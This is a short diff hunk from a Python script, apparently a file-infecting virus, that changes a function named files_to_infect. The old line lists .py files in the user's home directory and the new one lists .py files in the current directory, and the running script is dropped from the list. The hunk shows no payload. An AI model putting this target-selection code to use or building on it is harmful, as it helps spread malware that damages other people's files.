@@ -12,7 +12,7 @@ def files_to_infect():
 
     if platform.system() == 'Windows':
     
-     files_list = glob.glob('/home/{}/*.py'.format(getpass.getuser()))
+     files_list = glob.glob('*.py'.format(getpass.getuser()))
      files_list.remove(current_file)
 
      return files_list
